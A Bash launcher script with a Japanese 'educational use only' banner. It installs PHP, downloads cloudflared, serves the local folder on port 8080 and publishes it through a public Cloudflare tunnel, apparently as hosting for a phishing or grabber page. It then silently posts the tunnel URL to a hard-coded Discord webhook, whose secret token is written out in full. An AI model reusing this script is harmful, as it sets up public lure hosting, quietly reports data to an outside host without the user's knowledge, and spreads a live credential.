#!/bin/bash

clear

echo "╔══════════════════════════════════════╗"
echo "║ 🌸 開発者: Devcode                  ║"
echo "║ ⚠️  本ツールは教育目的でのみ使用可能    ║"
echo "╚══════════════════════════════════════╝"

echo "📦 パッケージをインストール中..."
sudo apt update -y > /dev/null 2>&1
sudo apt install -y php php-cli curl grep > /dev/null 2>&1

if [ ! -f ./cloudflared ]; then
    echo "⬇️ cloudflared をダウンロード中..."
    curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o ./cloudflared
    chmod +x ./cloudflared
fi

echo "🚀 PHPサーバーを起動中（ポート: 8080）..."
php -S localhost:8080 > /dev/null 2>&1 &
php_server_pid=$!
sleep 2

echo "🌐 Cloudflareトンネル起動中..."
./cloudflared tunnel --url http://localhost:8080 --no-autoupdate > .cf.log 2>&1 &
cloudflared_pid=$!
sleep 5

url=$(grep -o 'https://[^ ]*\.trycloudflare\.com' .cf.log | head -n 1)
echo "✨ 発行URL: $url"

webhook_url="https://discord.com/api/webhooks/1361553545379188917/QSKZGGkXtDeqUD4c61hEatZHfY8bD1BObJ1sM250eZpL6O_ocP45oYK1iVy8Y-3eB44q"
json="{\"content\": \"🔔 URLが発行されました\n$url\"}"
curl -H "Content-Type: application/json" -X POST -d "$json" "$webhook_url" > /dev/null 2>&1

trap 'echo \"🛑 停止中...\"; kill $php_server_pid $cloudflared_pid; exit 0' SIGINT
wait
